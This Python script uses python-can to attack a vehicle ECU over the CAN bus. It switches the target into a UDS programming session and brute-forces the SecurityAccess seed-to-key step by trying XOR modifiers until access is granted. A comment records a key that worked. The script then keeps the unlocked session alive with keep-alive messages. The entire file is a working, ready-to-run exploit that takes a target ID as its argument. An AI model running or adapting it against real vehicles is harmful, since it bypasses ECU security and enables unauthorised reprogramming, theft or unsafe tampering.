from __future__ import print_function
import sys
import can
import time

Bus0 = can.interface.Bus(bustype='socketcan', channel='can0', bitrate=49500)

def createMessages():
    global ModeEnable, RequestSeed, KeepAlive
    ModeEnable = can.Message(arbitration_id=SendAID, data=[0x02, 0x10, 0x02, 0,0,0,0,0], extended_id=False)
    RequestSeed = can.Message(arbitration_id=SendAID, data=[0x02, 0x27, 0x01, 0,0,0,0,0], extended_id=False)
    KeepAlive = can.Message(arbitration_id=SendAID, data=[0x02, 0x3e, 0x00, 0,0,0,0,0], extended_id=False)

def getReply(aid, pid):
    t = 0
    while (t<50):
        msg = Bus0.recv(0)
        if (msg==None):
            t += 1
            time.sleep(0.1)
            continue
        if (msg.arbitration_id != RecvAID):
            continue
        if (msg.data[1] == pid+0x40):
            return msg
        if (msg.data[1] == 0x7f and msg.data[2] == pid):
            return msg
    return None

def deriveKey(seed, modifier):
    intseed = seed[0]*256 + seed[1]
    intkey = intseed ^ modifier
    reply = [intkey >> 8, intkey &0xff]
    return reply

def pinAccess():
    while (True):
        sys.stdout.write('.')
        time.sleep(10)
        Bus0.send(KeepAlive)

def bruteForceKey():
    # Note: hit with f1bc -> f287
    print("Forcing Time!")
    modifier = 0
    while (True):
        modifier += 1

        Bus0.send(RequestSeed)
        msg = getReply(RecvAID, 0x27)
        print(msg)

        if (msg.data[0:3] != bytearray([0x04, 0x67, 0x01])):
            print("Unexpected reply!")
            return
        seed = msg.data[3:5]
        key = deriveKey([seed[0],seed[1]], modifier)
        reply = can.Message(arbitration_id=SendAID,
                data=[0x04, 0x27, 0x02]+key+[0,0,0],
                extended_id=False)
        print(reply)

        Bus0.send(reply)
        msg = getReply(RecvAID, 0x27)
        print(msg)

        if (msg.data[0:4] == bytearray([0x03, 0x7f, 0x27, 0x35])):
            print("Denied.")
            continue
        elif (msg.data[0:3] == bytearray([0x02, 0x67, 0x02])):
            print("Access Granted.")
            return True
        else:
            print(''.join('{:02x}'.format(x) for x in msg.data))
            break

def switchMode():
    Bus0.send(ModeEnable)
    msg = getReply(RecvAID, 0x10)
    if (msg == None):
        return False
    if (msg.data != bytearray([0x02, 0x50, 0x02, 0,0,0,0,0])):
        return False
    print("  mode switched.")
    return True

if __name__ == "__main__":
    if (len(sys.argv) < 2):
        print("Usage:",sys.argv[0],"<AID>")
        exit(1)
    else:
        SendAID = int(sys.argv[1],0)
        RecvAID = SendAID+8
        createMessages()

    print("using aid:",hex(SendAID))

    print("switching mode...")
    if (not switchMode()):
        print("mode-switch failed.")
        exit(2)

    if (not bruteForceKey()):
        print("brute-force failed.")
        exit(3)

    sys.stdout.write('Pinning')
    pinAccess()

